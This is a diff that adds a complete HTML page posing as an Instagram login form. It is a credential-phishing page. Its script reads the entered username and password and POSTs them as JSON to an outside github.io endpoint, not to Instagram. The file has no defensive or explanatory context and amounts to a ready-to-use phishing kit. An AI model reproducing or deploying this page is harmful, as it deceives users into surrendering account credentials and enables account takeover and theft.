@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Instagram Login</title>
+    <script>
+        function sendCredentials() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            
+            fetch("http://Scavenger17.github.io/Submit", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({ username: username, password: password })
+            });
+        }
+    </script>
+</head>
+<body>
+    <form onsubmit="sendCredentials(); return false;">
+        <input type="text" id="username" placeholder="Username" required><br>
+        <input type="password" id="password" placeholder="Password" required><br>
+        <input type="submit" value="Log In">
+    </form>
+</body>
+</html>
